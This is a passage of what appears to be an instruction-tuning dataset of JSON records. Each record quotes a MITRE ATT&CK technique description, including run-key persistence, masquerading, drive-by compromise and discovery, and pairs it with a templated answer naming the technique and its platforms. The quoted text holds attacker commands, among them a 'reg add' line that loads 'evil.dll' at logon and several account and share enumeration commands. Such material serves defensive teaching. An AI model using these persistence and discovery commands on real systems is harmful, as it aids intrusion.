locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives. The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil.dll\"</code> \n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n\nThe following Registry keys can control automatic startup of services during boot:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code>\n\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\n\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code>\n\nPrograms listed in the load value of the registry key <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> run automatically for the currently logged-on user.\n\nBy default, the multistring <code>BootExecute</code> value of the registry key <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager</code> is set to <code>autocheck autochk *</code>. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001);\nTechnique Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder (T1547.001) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",
    "context": "",
    "output": "The provided description is related to MITRE technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware's communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\n\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.",
      "answer": "The provided description is related to MITRE technique Dynamic Resolution (T1568);\nTechnique Dynamic Resolution (T1568) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Network Configuration Discovery: Internet Connection Discovery (T1016.001);\nTechnique System Network Configuration Discovery: Internet Connection Discovery (T1016.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using Ping, <code>tracert</code>, and GET requests to websites.\n\nAdversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.",
      "answer": "The provided description is related to MITRE technique System Network Configuration Discovery: Internet Connection Discovery (T1016.001);\nTechnique System Network Configuration Discovery: Internet Connection Discovery (T1016.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Network Share Discovery (T1135);\nTechnique Network Share Discovery (T1135) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   Net can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
      "answer": "The provided description is related to MITRE technique Network Share Discovery (T1135);\nTechnique Network Share Discovery (T1135) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.?",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Drive-by Compromise (T1189);\nTechnique Drive-by Compromise (T1189) is applicable to platforms: SaaS,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: SaaS,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring Application Access Token.\n\nMultiple ways of delivering exploit code to a browser exist (i.e., Drive-by Target), including:\n\n* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting\n* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary\n* Malicious ads are paid for and served through legitimate ad providers (i.e., Malvertising)\n* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).\n\nOften the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.\n\nTypical drive-by compromise process:\n\n1. A user visits a website that is used to host the adversary controlled content.\n2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. \n    * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.\n3. Upon finding a vulnerable version, exploit code is delivered to the browser.\n4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.\n    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.\n\nUnlike Exploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.\n\nAdversaries may also use compromised websites to deliver a user to a malicious application designed to Steal Application Access Tokens, like OAuth tokens, to gain access to protected applications and information. These malicious applications have been delivered through popups on legitimate websites.",
      "answer": "The provided description is related to MITRE technique Drive-by Compromise (T1189);\nTechnique Drive-by Compromise (T1189) is applicable to platforms: SaaS,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: SaaS,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
    "context": "",
    "output": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009);\nTechnique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence. Although often used as payloads in an infection chain (e.g. Spearphishing Attachment), adversaries may also create a new shortcut as a means of indirection, while also abusing Masquerading to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. Browser Extensions) to persistently launch malware.",
      "answer": "The provided description is related to MITRE technique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009);\nTechnique Boot or Logon Autostart Execution: Shortcut Modification (T1547.009) is applicable to platforms: Windows;\nTherefore, the given procedure description is related to platforms: Windows.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.",
      "answer": "The provided description is related to MITRE technique Exfiltration Over C2 Channel (T1041);\nTechnique Exfiltration Over C2 Channel (T1041) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as Archive Collected Data. Interactive command shells may be used, and common functionality within cmd and bash may be used to copy data into a staging location.\n\nAdversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.",
      "answer": "The provided description is related to MITRE technique Data Staged: Local Data Staging (T1074.001);\nTechnique Data Staged: Local Data Staging (T1074.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
    "context": "",
    "output": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "answer": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may interact with the native OS application programming interface (API) to execute behaviors. Native APIs provide a controlled means of calling low-level OS services within the kernel, such as those involving hardware/devices, memory, and processes. These native APIs are leveraged by the OS during system boot (when other system components are not yet initialized) as well as carrying out tasks and requests during routine operations.\n\nAdversaries may abuse these OS API functions as a means of executing behaviors. Similar to Command and Scripting Interpreter, the native API and its hierarchy of interfaces provide mechanisms to interact with and utilize various components of a victimized system.\n\nNative API functions (such as <code>NtCreateProcess</code>) may be directed invoked via system calls / syscalls, but these features are also often exposed to user-mode applications via interfaces and libraries. For example, functions such as the Windows API <code>CreateProcess()</code> or GNU <code>fork()</code> will allow programs and scripts to start other processes. This may allow API callers to execute a binary, run a CLI command, load modules, etc. as thousands of similar API functions exist for various system operations.\n\nHigher level software frameworks, such as Microsoft .NET and macOS Cocoa, are also available to interact with native APIs. These frameworks typically provide language wrappers/abstractions to API functionalities and are designed for ease-of-use/portability of code.\n\nAdversaries may use assembly to directly or in-directly invoke syscalls in an attempt to subvert defensive sensors and detection signatures such as user mode API-hooks. Adversaries may also attempt to tamper with sensors and defensive tools associated with API monitoring, such as unhooking monitored functions via Disable or Modify Tools.",
      "answer": "The provided description is related to MITRE technique Native API (T1106);\nTechnique Native API (T1106) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
